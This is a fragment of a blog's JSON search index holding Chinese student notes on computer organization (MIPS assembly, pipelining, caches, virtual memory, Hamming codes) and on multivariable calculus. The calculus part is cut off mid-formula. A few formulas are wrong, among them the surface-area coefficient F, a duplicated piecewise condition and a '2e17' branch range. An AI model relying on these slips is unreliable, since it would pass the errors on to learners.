\\\\$$","link":"/2023/01/24/%E6%9D%90%E6%96%99%E5%8A%9B%E5%AD%A6%E7%AC%94%E8%AE%B0/"},{"title":"计组笔记","text":"功夫再高，也怕挂科。 有时间还是把视频看一遍为好，UP 主讲得挺好的。 第一章 概述CPU 主要由运算器和控制器组成。高速缓存 cache 采用 SRAM，内存采用 DRAM。MIPS 和 ARM 都属于 RISC（Reduced Instruction Set Computer），x86 属于 CISC（Complex Instruction Set Computer）。Amdahl 定律：$t_{new} = t_{related}/S + t_{unrelated}$，$S$ 为加速比。 时钟周期数 = 指令数 x 平均每条指令所需周期数（即 cycles = IC x CPI）CPU 执行时间 = 指令数 x CPI x 时钟周期长（即 CPUtimes = IC x CPI x T）或 CPUtimes = IC x CPI / f 能耗 = 负载电容 x 电压^2 = $CU^2$功耗 = 1/2 x 负载电容 x 电压^2 x 开关频率 = $\\frac12 CU^2 f$ 七个伟大思想：使用抽象简化设计、加速大概率事件、通过并行提高性能、 通过流水线提高性能、 通过预测提高性能、存储器层次、通过冗余提高可靠性。 指令MIPS 一共有 32 个 32 位的寄存器程序中的变量放在保存寄存器（store reg）中：$s0~7 共 8 个运算的临时变量放在临时寄存器（temp reg）中：$t0~9 共 10 个零寄存器（zero reg）：$zero，常用于赋值为 0 三类指令：运算指令：add、sub、mul、div、and、or、xor、nor、slt、sll、srl、sra数据传送指令：lw、sw、lui决策指令：beq、bne、j、jal、jr 三种指令格式：R 型：op rd, rs, rtI 型：op rt, rs, immJ 型：op target 算术运算指令如 a, b, c 三个变量分别存放在 $s0, $s1, $s2 中，要计算 c = a + b，则汇编代码为： 1add $s2, $s0, $s1 计算 c = a - b，则汇编代码为： 1sub $s2, $s0, $s1 加立即数，假设变量 i 位于 $s0，要计算 i = i + 1，则汇编代码为： 1addi $s0, $s0, 1 要减就把立即数设为负数，故 MIPS 无 subi 指令。 逻辑运算指令比较简单，nor 为或非，就是先或再非，与 0 或非可以实现取反。 1sll $s2, $s0, 2 # $s2 = $s0 &lt;&lt; 2 运算指令例子result($s3) = a($s0) - 10 + (b($s1) + c($s2) * 5) 12345sll $t0, $s2, 2 # $t0 = c * 4add $t1, $t0, $s2 # $t1 = c * 5add $t2, $t1, $s1 # $t2 = b + c * 5addi $t3, $s0, -10 # $t3 = a - 10add $s3, $t3, $t2 # $s3 = a - 10 + (b + c * 5) 寄存器-存储器数据传送lw 即 load word假设数组 a 基址存放在 $s1 中，要把 a[5] 的值传送到 $s0 中： 1lw $s0, 20($s1) a[0] 到 a[5] 的距离是 5 个字，而在 MIPS 中，一个字是 4 个字节，所以 a[5] 的地址是 a 的基址加上 20。把 $t0 的值传送到 a[2]： 1sw $t0, 8($s1) 寄存器间数据传送把 $t0 的值传送到 $s1： 123addi $s1, $t0, 0add $s1, $t0, $zeromove $s1, $t0 # move 是伪指令，等价于 add $s1, $t0, $zero 把常数 10 传送到 $s2： 12addi $s2, $zero, 10li $s2, 10 # li 是伪指令，即 load immediate 装载 32 位立即数把 10A2 7FFF 放进 $s2： 12lui $s2, 0x10A2 # load upper immediateori $s2, $s2, 0x7FFF # or immediate 这里不能用 addi，因为如果低 16 位的最高位是 1，那么会被当作负数，造成结果错误。 例：数组元素运算与赋值a[i] = a[0] + 100000，数组 a 的基址存放在 $s0 中，i 存放在 $s1 中： 1234567lw $t0, 0($s0) # $t0 = a[0]lui $t1, 1 # notice: 100000 = 0x186A0 &gt; 0xFFFFori $t1, $t1, 0x86A0add $t2, $t0, $t1 # $t2 = a[0] + 100000sll $t3, $s1, 2 # $t3 = i * 4add $t4, $s0, $t3 # $t4 = &amp;a[i]sw $t2, 0($t4) # a[i] = a[0] + 100000 决策指令beq 即 branch equal，bne 即 branch not equalj 即 jump，无条件跳转例子：将如下代码翻译成 MIPS 汇编代码 12if (i == j) f = g + h;else f = g - h; 假设 f, g, h 分别存放在 $s0, $s1, $s2 中，i, j 分别存放在 $s3, $s4 中： 123456beq $s3, $s4, Elseadd $s0, $s1, $s2j ExitElse:sub $s0, $s1, $s2Exit: slt 即 set on less than，即小于则置位，否则清零（复位）比如 $s0 = 0, $s1 = 0, $s2 = 1，则： 1slt $s0, $s1, $s2 $s0 的会被置为 1，因为 0 &lt; 1。 例子： 1while (a[i] == k) i++; 假设 i 存放在 $s3，k 存放在 $s5，a 的基址存放在 $s6： 12345678Loop:sll $t0, $s3, 2 # $t0 = i * 4add $t1, $s6, $t0 # $t1 = &amp;a[i]lw $t2, 0($t1) # $t2 = a[i]beq $t2, $s5, Exit # if a[i] == k, exitaddi $s3, $s3, 1 # i++j LoopExit: 指令格式R 型指令指令中含三个寄存器的运算指令都属于 R 型（register type）指令，格式为 op rd, rs, rt。32 位的 MIPS 指令一共分为 6 个字段： 操作码（opcode）：6 位 源寄存器 1（register source 1，rs）：5 位 源寄存器 2（register source 2，rt，叫 rt 应该是因为 t 是 s 的下一个字母）：5 位 目的寄存器（register destination，rd）：5 位 移位量（shamt）：5 位 功能码（funct）：6 位 MIPS 有 32 个寄存器，所以 5 位就可以表示全部的 32 个寄存器，所以 rs、rt、rd 都是 5 位。R 型指令的 opcode 都是 0，由 6 位功能码指定操作，$t0 ~ $t7 的编号是 8-15，$s0 ~ $s7 的编号是 16-23，add 的 funct 是 32，sub 的 funct 是 34。sll/srl 也是 R 型指令，没有第二个源寄存器，rt 被置为 0，用 shamt 表示移位量。 I 型指令addi 和 ori 都属于 I 型（immediate type）指令，格式为 op rt, rs, imm。I 型指令用 opcode 表示操作，rs 表示源寄存器，rt 表示目的寄存器，并把 rd-shamt-funct 三个字段合并成了 16 位的 imm，即立即数。 lw 和 sw 也是 I 型指令，但是 rt 表示目的寄存器，rs 表示基址寄存器，和上面相反，imm 表示偏移量，这两个指令的操作码分别是 35 和 43。 I 型指令还有 beq 和 bne，用于分支。 J 型指令j 和 jal 都属于 J 型（jump type）指令，格式为 op target。 过程支持过程的三大寄存器：4 个参数寄存器 $a0 ~ $a3，两个返回值寄存器 $v0 ~ $v1，返回地址寄存器 $ra。 jal 即 jump and link，跳转到标签并保存返回地址到寄存器 $ra，由调用者主程序使用。jr 即 jump register，跳转到寄存器中的地址，由被调用者过程使用，一般是 jr $ra。 两个栈指针寄存器 $sp（stack pointer） 和 $fp （frame pointer），分别表示栈指针和帧指针。在过程调用时，如果要用到保存寄存器，就要先压入栈中，调用结束后再弹出。 还有一个全局指针寄存器 $gp，便于寻找位置固定的数据，如主程序使用的变量、声明为 static 的变量，统称静态变量。 一般程序在内存中有 5 个段，地址从低到高依次为 保留段 代码段 静态数据段 堆段（动态数据段） 栈段 堆由低向高增长，栈由高向低增长，双向奔赴，实现了内存空间的高效利用。 寻址R 型指令都是寄存器寻址。I 型指令第三个操作数（即第二个源操作数）是立即数的指令采用立即数寻址。lw 和 sw 采用基址偏移寻址。beq 和 bne 采用 PC(program counter) 相对寻址，分支 32 位地址 = PC + 4 + 字地址偏移量。J 型指令都是伪直接寻址，因为 J 型指令是由 6 位操作码和 26 位目标地址组成的，寻址时先左移 2 位形成 28 位字节地址，再和 PC 的高 4 位拼接成 32 位地址。 假设第一行代码的地址是 10000，对如下代码： 12345678Loop:sll $t1, $s3, 2 # Temp reg $t1 = i * 4add $t1, $t1, $s6 # $t1 = address of save[i]lw $t0, 0($t1) # Temp reg $t0 = save[i]bne $t0, $s5, Exit # go to Exit if save[i] != kaddi $s3, $s3, 1 # i = i + 1j Loop # go to LoopExit: bne $t0, $s5, Exit 中的立即数应该是 2，这里可以大概理解成隔了两条指令，而 j Loop 中的立即数稍微麻烦，首先因为 PC 的高 4 位是一样的，都是全 0，所以只需要考虑低 28 位，Loop 的地址是 10000，右移 2 位就是 100，所以 j Loop 的立即数是 100 （十进制的 4）的补码。 PC 相对寻址的范围是 (PC + 4) - 2e17 ~ (PC + 4 + 2e17 - 4)，大约是前后各 128 KB。伪直接寻址的范围是和 PC 高 4 位相同的一切地址，即 256 MB。要分支到更远的地址，就要把 beq 或者 bne 切换一下，然后下面跟一个 j 指令。比如 beq $s0, $s1, L1 就换成如下代码： 123bne $s0, $s1, L2j L1L2: 扩展跳转范围就直接换成 jr 指令，把目标地址放在寄存器中即可。32 位系统最多只能支持 4 GB 的内存，所以 32 位的寄存器已经支持全部的内存寻址了。 C 语言的 4 个翻译层次编译器将高级语言文件（.c）翻译成汇编文件（.asm），然后由汇编器将汇编文件翻译成机器码文件（.obj），再由链接器将机器码文件链接成可执行文件（.exe），最后由加载器将可执行文件加载到内存中执行。 算术运算整数的表示以下以 8 位二进制数为例：无符号整数很好理解，就是 8 位全用来表示数值，如 0000 0000 表示 0，1111 1111 表示 255。原码：用最高位表示正负号，其余 7 位表示绝对值反码：将最高位为 0 的原码按位取反表示负数补码：按位取反再加 1 符号扩展：16 位扩展到 32 位时，将最高位（即符号位）复制到高 16 位。 大端编址和小端编址：大端编址是将高位放在低地址，小端编址是将高位放在高地址。 比如 0xFFE0 在内存中时大端编址：低 8 位：0xFF高 8 位：0xE0小端编址：低 8 位：0xE0高 8 位：0xFF ALU符号位进位称为上溢，符号位借位称为下溢，统称溢出。 比较简单的 32 位 ALU 是行波进位加法器，即每一位都是一个全加器，每个全加器有三个输入：两个加数和上一位的进位，两个输出：和位和进位。但是每次进位都要过一次或门和与门，就产生了 64 个门延迟。 为了加快进位，进而加速加法运算，现在广泛采用超前进位加法器，通过将进位分为 4 位一组，抽象成每组的进行，实现加法器的并行执行。 要执行 n 位加法，求出 n 是 4 的几次方，并向上取整，再乘 2 加 1，就是超前进位加法器的门延迟。用数学表达式表示就是 $2 \\times \\lceil \\log_4 n \\rceil + 1$，n 为 16 时是 5，n 为 32 和 64 时都是 7。 除法中，规定余数和被除数同号，比如 -7/2 = -3 余 -1，而不是商 -4 余 1。 MIPS 中的乘除指令有 4 条，mult 和 div 是有符号的乘法和除法，multu 和 divu 是无符号的乘法和除法，均为双操作数 R 型指令。mfhi 和 mflo 分别是将乘法和除法的高 32 位和低 32 位传送到寄存器中，均为单操作数 R 型指令。 浮点数IEEE 754 标准规定了浮点数的表示方法，32 位单精度浮点数由 1 位符号位、8 位指数位和 23 位尾数位组成。注意指数要加 127 的偏差，同时这里的尾数是指小数点后的部分，因为二进制的科学计数法里，只要不是 0.0，那么小数点前的部分一定是 1。举个例子 -0.00101 = -1.01 x 2^-3，很明显，因为是负数，所以符号位是 1，指数位是 -3 + 127 = 124，尾数位是 01（后面补 0）。64 位双精度浮点数由 1 位符号位、11 位指数位和 52 位尾数位组成，指数偏差是 1023。 MIPS 中增加了单独的 32 个单精度浮点寄存器 $f0 ~ $f31，一对单精度浮点寄存器组合成一个双精度寄存器，以偶数编号。 add.s 和 sub.s 是单精度浮点数的加减法，mul.s 和 div.s 是单精度浮点数的乘除法，s 换成 d 就是双精度浮点数的运算。比较两个浮点数大小，用 c.eq.s 和 c.lt.s，分别表示等于和小于，为真时用 bc1t 跳转，为假时用 bc1f 跳转。 这里我查了一下应该是 bc1t 和 bc1f，但是课本写的是 bclt 和 bclf，我觉得应该是笔误。 IEEE 754 在运算时引入了两个尾数位，分别是保护位和舍入位，运算误差不超过 0.5 个 ulp（unit in the last place，即尾数最低位）。 处理器最核心的部分。 数字逻辑基础组合逻辑不含存储器，给定输入时输出唯一确定，如 ALU。状态逻辑（又称时序逻辑）含存储器，至少拥有两个输入：数据输入和时钟输入和一个输出。总线表示数据信息多于一位的信号线，在数字电路图中加粗表示并标记位宽，由于 MIPS-32 采用 32 位字，所以当总线为 32 位时不必写出位宽。 指令周期一条 MIPS 指令的执行分为 5 个阶段，统称一个指令周期，分别是： 取指令（IF，Instruction Fetch）：从内存中取指令 指令译码（ID，Instruction Decode）：译码并取寄存器 执行（EX，Execute）：执行指令 访存（MEM，Memory）：访问内存 写回（WB，Write Back）：写回结果 R 型指令和 lw/sw/beq 在 IF 的时候都是根据 PC 从存储器中取出指令。R 型指令在 ID 时取源操作数 rs 和 rt，在 EX 时执行运算，没有 MEM，因为三个操作数都是寄存器，WB 时将结果写回 rd。lw/sw 在 ID 时取基址寄存器 rs，并将偏移量 imm 符号扩展，EX 时计算内存地址，lw 在 MEM 时从内存中取数据，WB 时写回寄存器 rt，sw 在 MEM 时将数据写入内存，WB 时不做任何操作。beq 在 ID 时取 rs 和 rt，将字地址符号扩展并左移两位，EX 时比较 rs 和 rt，计算分支地址，MEM 时写回 PC，WB 时不做任何操作。 在单周期实现中，每条指令都在一个时钟周期内完成，CPI 为 1。多周期实现中可以缩减时钟周期到一个阶段的长度，一条指令占用几个阶段，就执行几个周期。 指令周期与流水级与指令周期的五个阶段相对应，把数据通路分为五个流水级，形成流水线（pipeline）。时钟周期数 = 指令数 + 流水级级数 - 1（cycles = IC + stages - 1）。理想加速比 = 流水级级数（$S_{理想}$ = stages）。理想条件为：1.每个流水级时间等长 2.流水线没有开销 3.指令数足够多。省略流水周期可能导致两条指令抢占同一流水级的硬件部件，引发结构冒险（structural hazard），解决的通行方法是添加硬件。 数据冒险产生原因及其解决办法产生原因：由于取到的指令需要的数据还没有准备好，导致指令不能在预定的时钟周期内执行。 解决办法：1）数据旁路：将数据从一个流水级传递到另一个流水级，而不是等到写回阶段再传递。2）先写后读：对寄存器堆操作时，前半个周期写，后半个周期读，可以减少一次数据冒险。3）插入气泡：在流水线中插入一个空操作，让后面的指令等待，直到数据准备好。 ALU 运算结果引出旁路传到另一个 ALU，叫做 ALU-ALU 旁路，从 MEM 级传到 ALU 叫做 MEM-ALU 旁路，两个旁路都有时，称为全旁路。 控制冒险产生原因及其解决办法产生原因：由于取到的指令并不是需要的指令，而导致指令不能在预定的时钟周期内执行。说具体点，比如 beq 指令在 EX 阶段后才知道是否要跳转，但是在 ID 阶段已经取到了下一条指令，如果要跳转，就要把下一条指令丢弃，导致控制冒险。 解决办法：1）缩短分支延迟：将分支地址计算从 EX 级提前到 ID 级；2）动态分支预测：通过查找指令地址观察上一次执行该指令时分支是否发生，如果上次执行时分支发生，就从上次分支发生的地方开始取新的指令；3）延迟分支调度：编译器通过分析代码用不影响分支的一条指令填充到分支延迟时间槽。 流水线性能流水线在同一时间处理多条指令的不同阶段，实现指令级并行。由时钟周期长度决定的吞吐率是评价流水线性能的重要指标。在两个流水级间插入流水线寄存器，以左右两个流水级命名，分别叫 IF/ID、ID/EX、EX/MEM、MEM/WB。流水线的时钟周期是由最慢的流水级决定的。流水线的控制信号在译码时产生，逐级递减。前半个周期写寄存器堆，后半个周期读寄存器堆，可以减少一次数据冒险。 控制单元信号 控制信号 功能 RegDst 启用 rd ALUSrc imm 输入 ALU MemtoReg 存储器写回 RegWrite 写寄存器堆 MemRead 读存储器 MemWrite 写存储器 Branch 分支 ALUOp1 / ALUOp0 ALU 操作码 以指令 and rd, rs, rt 为例，RegDst 为 1，没有立即数，所以 ALUSrc 为 0，没有任何与存储器有关的操作，所以 MemtoReg MemRead MemWrite 均为 0，不是 beq，所以 Branch 也为 0，然后 R 型指令的 ALUOp 信号都是 10。 加速比 = 改进前的时钟周期数 / 改进后的时钟周期数 存储层次cache 和内存L1-L3 高速缓存cache 通常集成在 CPU 中，采用静态随机访问存储器（SRAM）集成电路，由双稳态触发器构成，每 B（byte） 由 6-8 个晶体管组成，硬件规模较大L4 内存采用动态随机访问存储器（DRAM）集成电路，使用电容保存电荷，进而存储数据，每 B 仅使用一个晶体管，硬件规模远小于 SRAM（密度大于 SRAM），由于电荷只能短暂留存，需要周期性地将一行上的数据读出后重新写入，完成刷新SRAM 和 DRAM 在断电后很快丢失数据，称为易失性存储器（volatile memory）L5 二级存储器或辅存磁盘每个盘片由数万道磁道组成，每个磁道又被分为几千个扇区，扇区是最小的存储单位。现在多使用闪存，一种集成电路制造的电可擦除可编程只读存储器（EEPROM），数据更快，功耗更低。磁盘和闪存断电后不丢失数据，称为非易失性存储器（non-volatile memory） 局部性原理对一条程序正在执行的指令来说如果该指令位于循环体中，很可能不久后会被再次访问——时间局部性如果该指令位于循环体或顺序指令流中，将要执行的指令往往地址相近——空间局部性 那么就可以将内存中的一小块数据/指令复制到 cache 中，以提高访问速度。 命中与缺失访存即访问内存，分为读取和写入。访存指令 = MEM-reg 数据传送指令 = L-S 指令（即 lw 和 sw 指令）CPU 访问内存时，都会优先访问 cache，如果 cache 中有数据，就是命中，否则就是缺失。命中/缺失占访存次数的比例叫做命中率（HR，Hit Rate）和缺失率（MR，Miss Rate），满足 HR + MR = 1。 访存阻塞周期数CPU 访问 cache 的时间称为命中时间，通常只有 1TCPU 访问内存比访问 cache 多出来的时间称为缺失代价（Miss Penalty）注意访问内存比直接访问 cache 多出来的额外开销，才是缺失代价 定义一个程序的 L-S 指令数目为访存次数（MAC，Memory Access Count）定义程序中 L-S 指令占总指令数的比重为访存率（MAR，Memory Access Rate）为了评价存储器性能，我们将程序执行的周期 cycles 分为 CPU 执行周期数 + 访存阻塞周期数两部分访存阻塞周期数 = 访存次数 x 缺失率 x 缺失代价 = MAC x MR x MP 直接映射块号cache 块号 = 内容块号 % cache 块数对 $2^n$ 个块的 cache，cache 块号 = 内存二进制块号的后 n 位注意内存的块号是地址的前 30 位，假设 cache 有 1K（即 $2^{10}$ 个块），对访存地址 0000 0000 0000 0000 0000 0000 0011 1100，其块号是 00 0000 0000 0000 0000 0000 0000 1111，对应的 cache 块号是 00 0000 1111 内存地址字段可以把 32 位内存地址分成三段① 标记位 ② 索引位 ③ 块内（字节）偏移索引位就是 cache 块号，后面的两位指示具体访问块中的哪个字节索引位前面的高位是标记位，结合索引位就能唯一确定内存中的块 cache 最前面还要加上一个有效位，用于标记 cache 中的块是否有效 cache 位数计算处理器访存读写的数据通常为一个 32 位字，一字一块根本不能利用空间局部性。 假设一个 16 KB 数据的 cache，块大小为 4 个字，地址为 32 位，问该 cache 总共需要多少字节？首先块大小是 4 个字即 16 字节，所以块偏移应该占 4 位，16 KB/16 B = 1 K = 1024，所以索引位应该占 10 位，剩下的 18 位就是标记位。对每个块，还要有一个有效位，所以一个块就有 1 + 18（地址标记） + 16*8 = 147 个 bit总容量就是 147 x 1024 = 150528 bit = 18792 B = 18.375 KB注意这里如果题目换成 16 KB 的 cache 也默认是 16 KB 数据的 cache，不是 16 KB 容量的 cache。 缺失分类 3C 模型根据产生原因，缺失分为以下三大类： 首次访问 cache 中没有的块必然产生的缺失，称为冷启动强制缺失（Compulsory Miss） 由于 cache 的容量不能容纳程序执行需要的所有块，部分块被替换后再次调入 cache，称为容量缺失（Capacity Miss） 多个内存块竞争映射到同一个 cache 块，导致仍需使用的块被替换，称为冲突碰撞缺失（Conflict Miss） 都是 C 开头的，所以称为 3C 模型 适当增加块大小（同时也会减少块数）可以更好地利用空间局部性，减少强制缺失；但是块数减少会增加冲突缺失。加大 cache 容量可以减少容量缺失 缺失处理和写策略cache 访问缺失处理的步骤为： 将 PC + 4 - 4（即当前指令的地址）写回 PC，并阻塞处理器 访问内存，将内存块写入 cache 再次访问 cache 并命中 当 CPU 把新数据写入内存块时，又要把数据写到 cache，保持内存和 cache 内容一致方式一：CPU 和 cache 同时开始写内存，称为写直达（Write Through），但是开销很大，可改进为缓冲，CPU 较快写入缓冲后执行其他操作，缓冲再慢慢写入内存方式二：CPU 只写入 cache，仅当这个 cache 块被替换时才写入内存，称为写回（Write Back） 全相联映射内存块可能映射到任何一个 cache 块，称为全相联映射（Fully Associative Mapping）内存块可进入任何一个 cache 块，只要 cache 中有空位，就可以直接进入，不会产生冲突缺失如果 cache 已满，则替换掉最长时间没有使用过的内存块，称为最近最少使用（Least Recently Used，LRU）替换策略查找时需要比较每一块的标记位，开销过大，只适用于块数较少的 cache 组相联映射将直接映射和全相联映射折中，对 cache 块进行分组，一个内存块直接映射到一个组，但分配到组内的哪一块较为自由，也就是在一个组内全相联，这种映射方式称为组相联映射（Set Associative Mapping）一组包含 n 块则称为 n 路组相联，其相联度为 n直接映射就是 1 路组相联，全相联就是相联度 = 块数的组相联 cache 组号 = 内存块号 % cache 组数对 $2^n$ 个组的 cache，cache 组号 = 内存二进制块号的后 n 位 缺失处理、写策略、替换策略全相联和组相联的缺失处理过程和直接映射相同替换策略采用 LRU，用 1 位来编号记录 2 路组相联一组最久没有使用的块，用 2 位来编号记录 4 路组相联一组最久没有使用的块，以此类推，这个编号称为 LRU 位实际上，LRU 的开销仍然较大，很多 4 路组相联的系统也只是近似实现 LRU 例 假设一个 cache 有 4096 个块，块大小为 4 个字，地址为 32 位，请计算两路组相联、全相联中 cache 的总位数。 4 个字就是 16 个字节，用 4 位表示块偏移；两路组相联就是每组有两个块，那么就是 2048 即 $2^{11}$ 组，用 11 位表示索引位，剩下的 17 位就是标记位，那么对每个块就有 1 + 17 + 16 x 8 = 146 位，总共就是 146 x 4096 = 598016 位 = 74752 B = 73.0 KB cache 性能评价：AMAT 与 CPI平均访存时间（Average Memory Access Time，AMAT）是评价 cache 性能的重要指标，用周期数表示即可，不一定要化成秒平均访存时间 = 命中时间 + 缺失率 x 缺失代价（AMAT = HT + MR x MP） 例 设处理器基本 CPI 为 1，时钟频率为 4 GHz。设访存指令占指令数的 20%，一级 cache 缺失率为 10%，速度可满足处理器全速运行；现增加一个二级 cache，访问时间为 5 ns，全局缺失率为 2.5%，访问主存的时间为 100 ns。二级 cache 局部缺失率和该处理器的 CPI 为多少？ 缺失率 = 2.5% / 10% = 25%时钟频率为 4 GHz，那么时钟周期就是 0.25 ns，5 ns = 20 个时钟周期，100 ns = 400 个时钟周期CPI = 1 + 20 x 20% x 10% + 400 x 20% x 2.5% = 3.4若题干改为：一级 cache 中每条指令的缺失率为 2%，二级 cache 使得访问主存的缺失率减少到 0.5%则 CPI = 1 + 20 x 2% + 400 x 0.5% = 1 + 0.4 + 2 = 3.4 多核 CPU 中的 cache 一致性最常用的 cache 一致性协议是监听（Snooping）协议，每个 cache 都监听其他 cache 的读写操作，当有 cache 写入数据时，其他 cache 会将该数据置为无效，这称为写时无效协议（Write Invalidate Protocol）使两个核的写操作一前一后的机制称为写串行化（Write Serialization） 广义 cache任意两级相邻的存储器中较高的一级都可以称为较低一级存储器的广义的 cache高速缓存是内存的 cache，同样，内存是磁盘的 cache，TLB 快表是页表的 cache 虚拟地址转换为物理地址虚拟内存的空间大于物理内存磁盘和内存之间交换的块称为页（Page）对 4 KB 即 $2^{12}$ B 的页，需要 12 位表示页内偏移虚拟页号通过查询页表（Page Table）转换为物理页号，由于内存和磁盘中页大小相同，页内偏移和物理页号拼接形成物理地址 页表和页表项 页表寄存器 缺页处理每个进程都有一张页表，存放自己的内存空间页表首地址存放在页表寄存器（Page Table Register，PTR）中页表项记录每个虚拟地址对应的物理地址和高速缓存类似，页表中需要一个有效位来识别访问的页是否在内存中访问页不在内存时，产生一次缺页，此时需要读取磁盘用于扩充物理内存的部分，即交换区（Swap Space） 替换策略 写策略当一个进程的物理内存空间占满时，从磁盘交换区中调入内存的块需要替换掉内存中的某一块使用引用位（Reference Bit）来近似实现 LRU 替换算法 由于磁盘访问时间长达几千万个时钟周期，所以需要尽量减少访问磁盘特别是写入磁盘的操作因为内存中的页只能使用写回机制写入磁盘还需要在页表中添加一个脏位（Dirty Bit），用于标记页是否被修改过，被修改过的才需要写回磁盘 TLB 快表页表位于内存中，CPU 访存时，需要先拿着虚拟地址访存读取页表得到物理地址，再真正进行访存为了加快第一次物理地址的访存，引入了页表的 cache，即 TLB（Translation Lookaside Buffer） 页表将每一个虚拟页号作为索引，因此不需要类似于标记位的字段，但是 TLB 只保存部分虚拟页号的映射信息故 TLB 需要将虚拟页号作为标记位，并保留页表中全部信息，即 3 个标志位和物理页号 可靠性与可用性评价从开始使用到失效的时间间隔称为平均无故障时间（Mean Time To Failure，MTTF）应对故障从而提高 MTTF 的策略有：故障避免、故障容忍、故障预报一年的时长比上 MTTF 得到年失效率（Annual Failure Rate，AFR），即 AFR = 一年 / MTTF 恢复一个系统功能的时间为平均维修时间（Mean Time To Repair，MTTR）从开始使用到失效维修结束为平均失效间隔时间（Mean Time Between Failures，MTBF）可用性定义为系统正常工作时间与两次服务中断间隔时间之比MTBF = MTTF + MTTR可用性 = MTTF / MTBF 奇偶校验码 汉明距离在奇校验中，校验位确保整个校验码有奇数个 1，偶校验则相反任意两个合法校验码之间至少相差的位数称为汉明距离（码距）奇偶校验码距为 2，能实现检测一位错（Single Error Detection，SED），但不能定位错误 汉明码对 8 位数据 1001 1010 编入偶校验的汉明校验码 从左往右第 1、2、4、8 位挖空 其他位依次填入数据 对校验位 p1，检测 1、3、5、7 位 对校验位 p2，检测 2、3、6、7、10、11 位 对校验位 p4，检测 8、9、10、11、12 位 如下表所示 位号 1 2 3 4 5 6 7 8 9 10 11 12 偶校验结果 分类位号 p1 p2 d1 p4 d2 d3 d4 p8 d5 d6 d7 d8 - 数据 0 1 1 1 0 0 1 0 1 0 1 0 - p1 覆盖 √ √ √ √ √ √ 1 p2 覆盖 √ √ √ √ √ √ 1 p4 覆盖 √ √ √ √ √ 1 p8 覆盖 √ √ √ √ √ 1 所以其汉明码为 011100101010汉明码码距为 3，能够定位一位错，对该位取反可实现纠正一位错（Single Error Correction，SEC）定位步骤： 根据新的码字，重新进行汉明码校验编码 将新旧两组校验位从右往左写，按位异或 结果即为出错位号 如果码距为 4，能够检测两位错，但不能纠正 从客户端到云的并行处理器第四章讨论指令级并行，这一章讨论的是任务级并行，主要通过多核和多线程实现。单指令流多数据流（SIMD）计算机对向量数据进行操作，性能优于标量机。Roofline 模型被广泛用于评价并行浮点计算机的性能。 汇编语言拥有编译器输出语言和编程语言两种角色。使用汇编语言编程的情况：1）性能要求极端苛刻，如控制汽车刹车的嵌入式系统2）需要深入硬件底层优化程序3）需要使用定制指令4）为没有可用编译器的老旧计算机编写程序 参考https://www.bilibili.com/video/BV1je4y1Q7BK","link":"/2024/06/05/%E8%AE%A1%E7%BB%84%E7%AC%94%E8%AE%B0/"},{"title":"高数下笔记","text":"挂科了，还是要学好高数啊！ 前言玩脱了，光顾着搞技术，绩点炸了。高数 59 ，有人问我说我是不是得罪老师了——但是有没有一种可能，就是。。平时分已经给满了（） 笔记正文第六章 多元函数微分学1. 多元函数2. 多元函数的极限3. 多元函数的连续性4. 偏导数与全微分例（2020-2021第二学期期末，1）确定实数 $\\alpha$ 的范围，使函数 $f(x,y)=\\left\\{\\begin{aligned} (x^2+y^2)^\\alpha\\sin\\frac{1}{x^2+y^2},x^2+y^2\\neq0 \\\\ 0,x^2+y^2\\neq0\\end{aligned}\\right.$ 在 $(0,0)$ 处可微。解$$\\lim_{x\\rightarrow0}\\frac{f(x,0)-f(0,0)}{x-0}=\\lim_{x\\rightarrow0}\\frac{x^{2\\alpha}\\sin\\frac{1}{x^2}}{x}=\\lim_{x\\rightarrow0}x^{2\\alpha-1}\\sin\\frac{1}{x^2}$$当 $2\\alpha-1&gt;0$ 时，极限为 $0$ ，即 $f_x’(0,0)=0$ ，此时类似地，有 $f_y’(0,0)=0$ 5. 复合函数与隐函数的微分法6. 方向导数与梯度7. 多元函数的微分中值定理与泰勒公式8. 隐函数存在定理9. 极值问题先用 $f_x’=f_y’=0$ 求出稳定点，再令 $A=f_{xx},B=f_{xy},C=f_{yy}$ ，仅 $B^2 &lt; AC$ 时可以确定极值，此时 $A&gt;0$ 就是极小值， $A &lt; 0$ 就是极大值。与二元函数类似。 例（2021-2022第二学期期末，4）求多元函数 $f(x,y)=xe^{-\\frac{x^2+y^2}{2}}$ 的极值。解 $f_x’=e^{-\\frac{x^2+y^2}{2}}(1-x^2),f_y’=e^{-\\frac{x^2+y^2}{2}}(-xy)$ ，令 $f_x’=f_y’=0$ ，得到 $(-1,0)$ 和 $(1,0)$ 两个稳定点。令 $A=f_{xx}=e^{-\\frac{x^2+y^2}{2}}(x^3-3x),B=f_{xy}=e^{-\\frac{x^2+y^2}{2}}(-y+x^2y),C=f_{yy}=e^{-\\frac{x^2+y^2}{2}}(-x+xy^2)$ ，代入 $(1,0)$ 得到 $A=-2e^{-\\frac{1}{2}}&lt;0$，$B=0$ 第七章 重积分1. 二重积分的概念与性质2. 二重积分的计算例（2021-2022第二学期期末，2）求 $I=\\int_0^1\\mathrm{d}x\\int_0^{\\sqrt{1-x^2}}(x^2+y^2)\\mathrm{d}y$解 作极坐标变换 $x=r\\cos\\theta,y=r\\sin\\theta$，则$$I = \\int_0^{\\frac{\\pi}{4}}\\mathrm{d}\\theta\\int_0^1 r\\cdot r\\mathrm{d}r = \\frac{\\pi}{12}$$例（2017-2018第二学期期末，1）计算二重积分 $\\iint_D\\frac{|y|}{x^2+y^2}\\mathrm{d}x\\mathrm{d}y$，其中 $D$ 为圆环区域 $1\\leq x^2+y^2\\leq 4$。解 作极坐标变换，有$$I = \\int_0^{2\\pi}\\mathrm{d}\\theta\\int_1^2 \\frac{|r\\sin\\theta|}{r^2}\\cdot\\mathrm{d}r = \\int_0^{2\\pi}|\\sin\\theta|\\mathrm{d}\\theta\\int_1^2\\mathrm{d}r = 4\\int_0^{\\frac{\\pi}{2}}\\sin\\theta \\mathrm{d}\\theta\\int_1^2\\mathrm{d}r = 4$$ 3. 三重积分的概念与计算4. 重积分的应用举例曲面 $S$ 由参数方程 $x=x(u,v),y=y(u,v),z=z(u,v), (u,v)\\in D’$ 给出时，可计算$$E = x_u^2+y_u^2+z_u^2 \\\\F = x_ux_v+y_ux_v+z_ux_v \\\\G = x_v^2+y_v^2+z_v^2$$从而$$S = \\iint\\limits_{D’}\\sqrt{EG-F^2}\\mathrm{d}u\\mathrm{d}v$$ 第八章 曲线积分与曲面积分1. 第一型曲线积分（对弧长的曲线积分）这个非常地简单直观，就是求一条曲线（如二次函数的某一段）的长度。平面曲线求法：$$\\int_Lf(x,y)ds=\\int_\\alpha^\\beta 